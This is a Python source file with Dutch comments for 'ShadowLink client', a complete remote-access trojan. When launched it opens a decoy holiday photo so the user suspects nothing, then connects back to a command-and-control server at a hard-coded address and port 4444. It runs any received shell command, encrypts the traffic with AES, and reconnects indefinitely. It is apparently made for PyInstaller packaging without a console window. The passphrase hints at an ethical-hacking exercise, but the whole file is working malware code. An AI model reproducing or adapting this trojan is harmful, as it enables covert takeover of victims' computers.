#!/usr/bin/env python3
"""
ShadowLink client - Fase 3 (AES-256 + decoy foto)
Bij uitvoering opent een echte foto als afleidingsmanoeuvre, terwijl de
reverse shell verbinding maakt met de C2-server op Kali.
"""
import hashlib
import os
import socket
import struct
import subprocess
import sys
import time

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

SERVER_HOST = "192.168.174.128"
SERVER_PORT = 4444
RECONNECT_DELAY = 5
PASSPHRASE = b"ShadowLink-EH-2026"
KEY = hashlib.sha256(PASSPHRASE).digest()


def open_decoy():
    """Open de meegebundelde foto zodat de gebruiker niets vermoedt."""
    if getattr(sys, 'frozen', False):
        # PyInstaller: tijdelijke uitpak-map
        base = sys._MEIPASS
    else:
        base = os.path.dirname(os.path.abspath(__file__))
    foto = os.path.join(base, 'vakantie.jpg')
    if os.path.exists(foto):
        # os.startfile is de standaard Windows API om een bestand met zijn
        # standaard-applicatie te openen. Werkt ook vanuit --noconsole exe.
        os.startfile(foto)


def encrypt(plaintext: bytes) -> bytes:
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return iv + cipher.encrypt(pad(plaintext, AES.block_size))


def decrypt(blob: bytes) -> bytes:
    iv, ct = blob[:AES.block_size], blob[AES.block_size:]
    cipher = AES.new(KEY, AES.MODE_CBC, iv)
    return unpad(cipher.decrypt(ct), AES.block_size)


def send_msg(sock, plaintext: bytes):
    blob = encrypt(plaintext)
    sock.sendall(struct.pack("!I", len(blob)) + blob)


def recv_msg(sock) -> bytes | None:
    header = b""
    while len(header) < 4:
        chunk = sock.recv(4 - len(header))
        if not chunk:
            return None
        header += chunk
    length = struct.unpack("!I", header)[0]

    blob = b""
    while len(blob) < length:
        chunk = sock.recv(min(4096, length - len(blob)))
        if not chunk:
            return None
        blob += chunk
    return decrypt(blob)


def execute(cmd: str) -> bytes:
    if cmd.strip().lower().startswith("cd "):
        target = cmd.strip()[3:].strip()
        try:
            os.chdir(target)
            return f"[+] Map: {os.getcwd()}".encode("utf-8", errors="replace")
        except OSError as e:
            return f"[-] cd mislukt: {e}".encode("utf-8", errors="replace")

    try:
        proc = subprocess.run(cmd, shell=True, capture_output=True, timeout=60)
        output = proc.stdout + proc.stderr
        return output if output else b"[no output]"
    except subprocess.TimeoutExpired:
        return b"[-] Commando timeout (60s)"
    except Exception as e:
        return f"[-] Fout: {e}".encode("utf-8", errors="replace")


def session(sock):
    while True:
        cmd_bytes = recv_msg(sock)
        if cmd_bytes is None:
            return
        cmd = cmd_bytes.decode("utf-8", errors="replace").strip()
        if cmd.lower() in ("exit", "quit"):
            sock.close()
            raise SystemExit(0)
        send_msg(sock, execute(cmd))


def main():
    # Stap 1: open de decoy-foto (gebruiker ziet een foto, niks anders)
    open_decoy()

    # Stap 2: verbind met C2 en start de reverse shell
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((SERVER_HOST, SERVER_PORT))
            session(sock)
        except SystemExit:
            raise
        except (ConnectionRefusedError, OSError):
            pass
        except (ValueError, KeyError):
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
        time.sleep(RECONNECT_DELAY)


if __name__ == "__main__":
    main()
